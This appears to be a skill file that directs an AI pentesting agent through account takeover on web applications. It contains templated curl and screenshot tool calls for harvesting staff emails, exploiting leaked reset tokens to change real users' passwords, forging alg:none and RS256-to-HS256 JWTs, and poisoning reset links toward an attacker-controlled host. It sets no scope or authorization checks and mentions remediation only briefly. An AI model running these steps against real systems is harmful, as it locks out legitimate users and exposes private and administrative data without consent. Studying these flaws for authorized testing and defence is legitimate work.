---
name: auth-bypass
description: Universal methodology for authentication bypass, JWT manipulation (alg:none confusion, RSA public key misuse), password reset flaws, response-body token disclosure, host header injection, and post-authentication privilege escalation.
---

# AUTHENTICATION BYPASS METHODOLOGY

When testing authentication, session management, JWT tokens, password reset, or account recovery mechanisms on a web target, execute the following dynamic methodology.

## 1. Tool Selection & Execution Strategy
**CRITICAL RULE:** For a directed web application or authentication bypass task, **DO NOT waste time on network/infrastructure recon.**
- **DO NOT USE:** `subfinder`, `dnsx`, `naabu`, `nmap`, or DNS brute-forcing tools. These are irrelevant to web application logic testing.
- **DO USE:** 
  - `spider` to crawl the application, identify all exposed routes, extract forms, and map API endpoints.
  - `curl` with proper HTTP methods, headers (`Content-Type: application/json`), and structured payloads (`json`/`data`) to inspect raw responses.

## 2. Dynamic Surface Discovery & Flow Mapping
Do not assume or guess endpoint names. Always extract the real application structure from spidering results:
1. **Discover Routes & Endpoints:** Identify from the crawl:
   - Discovered API endpoints and data feeds (e.g., content feeds, article routes, user directories, configuration endpoints, JWKS routes).
   - Authentication routes: Login forms, session endpoints, password recovery/forgot endpoints, and password reset endpoints.
2. **Inspect Discovered Data Routes First:**
   - Modern single-page and web applications fetch backend data via API routes.
   - For **every** data/content API endpoint discovered during crawling (e.g., posts, news, staff, users), issue a `GET` request via `curl` to examine the full raw JSON output BEFORE attempting any authentication or recovery requests.
   - Harvest valid target identities (e.g., staff emails, usernames, roles, admin designations) from response objects.
   - **CRITICAL:** Do NOT guess or invent fake placeholder emails (like `test@example.com` or `admin@local`). Real backend recovery, reset, and authentication logic only activates for existing, registered identities harvested from the application.

## 3. Response Body Token Disclosure (Direct Flaw Check)
Before testing out-of-band vectors or complex chains, check if the application leaks the password recovery token directly back to the client:

1. **Submit Recovery Request:**
   Send a `POST` request to the application's discovered recovery/forgot endpoint using a harvested, valid identity:
   ```json
   {
     "tool": "curl",
     "args": {
       "url": "<discovered_recovery_endpoint>",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
       "json": {"<identity_field>": "<harvested_identity_email>"}
     }
   }
   ```
2. **Inspect the Full Response Body:**
   - Read the entire JSON response. Look for any disclosure of tokens, reset URLs, confirmation codes, or preview objects (e.g., `token`, `reset_url`, `preview`, `code`, or unique session identifiers).
   - *Note on Enumeration Safeguards:* If the endpoint returns a generic success message when tested with non-existent or placeholder emails, this does not confirm the endpoint is secure. Re-test using confirmed, harvested user accounts before ruling out leakage.

3. **Complete the Authentication Chain:**
   - If a reset token/code is leaked in the response, submit it to the application's discovered reset endpoint:
     ```json
     {
       "tool": "curl",
       "args": {
         "url": "<discovered_reset_endpoint>",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
         "json": {
           "<token_field>": "<leaked_token>",
           "<password_field>": "NewSecurePassword123!"
         }
       }
     }
     ```
   - Log in via the discovered login endpoint using the updated credentials:
     ```json
     {
       "tool": "curl",
       "args": {
         "url": "<discovered_login_endpoint>",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
         "json": {
           "<identity_field>": "<harvested_identity_email>",
           "<password_field>": "NewSecurePassword123!"
         }
       }
     }
     ```
   - Verify access to privileged or authenticated areas (e.g., user profiles, admin consoles, internal records) using the resulting session.
   - **MANDATORY VISUAL PROOF (gowitness):** Immediately capture visual Proof of Concept using `gowitness` on the authenticated web UI (e.g. `/pulse/portal`, `/pulse/dashboard`, `/pulse/admin`, `/pulse/profile`) using the acquired session cookie:
     ```json
     {
       "tool": "gowitness",
       "args": {
         "url": "<discovered_authenticated_portal_url>",
         "headers": {"Cookie": "<session_cookie_e.g._p_sid=...>"}
       }
     }
     ```
   - **Record Verified Finding:** Log the confirmed vulnerability in structured memory via `record_finding`:
     ```json
     {
       "tool": "record_finding",
       "args": {
         "title": "Account Takeover via Password Reset Token Leakage",
         "kind": "auth_bypass",
         "severity": "critical",
         "request_ref": "<discovered_recovery_endpoint>",
         "note": "Password reset token disclosed directly in HTTP response body; allowed full account takeover of staff/admin account."
       }
     }
     ```

## 4. JWT Authentication Bypass & Algorithm Confusion

When the application uses JSON Web Tokens (JWT) for authentication (stored in cookies like `p_sid`, `token`, `session`, `auth_token`, or passed in the `Authorization: Bearer <jwt>` header):

### A. Decode and Analyze Existing Tokens
1. Split the token into Header, Payload, and Signature (`<header>.<payload>.<signature>`).
2. Base64url-decode both Header and Payload to inspect:
   - Header: `alg` (e.g. `HS256`, `RS256`, `none`), `typ`, `kid`, `jwk`, `jku`.
   - Payload: Subject (`sub`), email, username, role (`role`, `roles`, `isAdmin`, `is_admin`), permissions, and expiration (`exp`).

### B. Attack Vector 1: Algorithm Confusion (`alg: "none"`)
Many insecure JWT verification implementations accept tokens signed with the `none` algorithm or fail to enforce cryptographic signature verification when `alg` is set to `none` (case-insensitive variants).

1. **Construct Unsigned Token Header:**
   - Standard: `{"alg": "none", "typ": "JWT"}`
   - Filter-bypass variants: `{"alg": "None"}`, `{"alg": "NONE"}`, `{"alg": "nOnE"}`
2. **Forge Privileged Payload:**
   - Set identity to harvested staff/administrator identity (e.g. `{"sub": "admin", "email": "<harvested_admin_email>", "role": "admin", "admin": true, "exp": 9999999999}`).
3. **Assemble Unsigned JWT:**
   - Base64url-encode Header and Payload (replacing `+` with `-`, `/` with `_`, and stripping all `=` padding).
   - Concatenate Header and Payload with a trailing dot and **NO** signature:
     ```
     <base64url_header>.<base64url_payload>.
     ```
4. **Submit and Verify:**
   - Send `curl` request to protected endpoint (e.g. `/portal`, `/api/admin`, `/api/user/profile`) with the forged token in the `Cookie` or `Authorization` header.
   - If accepted (200 OK / privileged data returned), proceed to visual capture and finding recording.

### C. Attack Vector 2: RSA Public Key Misuse (RS256 → HS256 Algorithm Confusion)
When an application uses RS256 (asymmetric signing where the server signs with a private key and verifies with a public key), vulnerable JWT libraries allow switching the algorithm to HS256 (symmetric HMAC). If the server passes its RSA public key to the generic verification function, the HMAC algorithm uses the **public key as the HMAC secret**:

1. **Obtain the Server's RSA Public Key:**
   - Check standard public key endpoints: `/.well-known/jwks.json`, `/api/auth/jwks`, `/public.pem`, `/cert.pem`, or TLS certificates.
   - Convert JWK format to PEM string if necessary (`-----BEGIN PUBLIC KEY-----...-----END PUBLIC KEY-----`).
2. **Forge Header with Symmetric Algorithm:**
   - `{"alg": "HS256", "typ": "JWT"}`
3. **Sign Payload with Public Key as Secret:**
   - Sign the Base64url `<header>.<payload>` using HMAC-SHA256 with the server's public key text (or raw public key bytes) as the HMAC key.
4. **Submit and Test:**
   - Send the forged token to authenticated API routes or web dashboards.

### D. Mandatory Verification & Evidence for JWT Flaws
1. **Capture Visual Proof (gowitness):**
   ```json
   {
     "tool": "gowitness",
     "args": {
       "url": "<discovered_authenticated_portal_url>",
       "headers": {"Cookie": "<cookie_name>=<forged_jwt_token>"}
     }
   }
   ```
2. **Log Finding:**
   ```json
   {
     "tool": "record_finding",
     "args": {
       "title": "Authentication Bypass via JWT Algorithm Confusion (alg:none)",
       "kind": "auth_bypass",
       "severity": "critical",
       "request_ref": "<protected_endpoint_url>",
       "note": "Backend accepts unsigned JWT tokens with alg:none; allowed full authentication bypass and privilege escalation to administrator."
     }
   }
   ```

## 5. Host Header Injection (Password Reset Poisoning)
If the response body does not directly leak the token:
- Test if the backend dynamically constructs the reset URL using the client-supplied `Host` header:
  - Submit the password recovery request with a modified `Host` or `X-Forwarded-Host` header pointing to an external domain or controlled listener.
  - If the server accepts the header and issues a reset email containing the poisoned host, the reset token will be delivered to the attacker-controlled server upon user click.

## 6. Post-Authentication Privilege Assessment
Once authenticated into any account:
- Inspect session tokens, user profile endpoints, and role attributes.
- If access is restricted or non-privileged, identify high-privilege accounts (administrators, managers, owners) from initial discovery data and re-apply the recovery/forgery flow against the elevated account.
- Probe for access to administrative panels, sensitive endpoints, or internal data APIs to evaluate total business impact.

## 7. Proof of Concept & Bounty Escalation Documentation
When reporting an authentication bypass or account takeover:
1. **Concrete Evidence / PoC:**
   - Document the full reproduction chain with exact requests, response snippets, leaked/forged tokens, and resulting authenticated session cookies.
   - Highlight any exposed high-value assets (e.g., admin controls, EHR/PHI records, internal API keys, database connection strings, S3/storage bucket links).
   - Reference the visual PoC screenshot captured via `gowitness` demonstrating authenticated access to the confidential member/admin portal.
2. **Impact Escalation for Maximum Bounty:**
   - **Severity Rating:** Classify under VRT/CVSS (typically **Critical / High** for ATO).
   - **Business Impact:** Clearly explain how taking over a privileged identity allows unauthorized data exfiltration, compliance violations (e.g., HIPAA/GDPR), and complete administrative compromise.
   - **Remediation Steps:** Advise on generating cryptographically secure, out-of-band delivery of reset tokens, enforcing strict JWT algorithm allowlists (rejecting `none` and symmetric HMAC when expecting RSA), validating signatures strictly, and removing debug previews in production API responses.


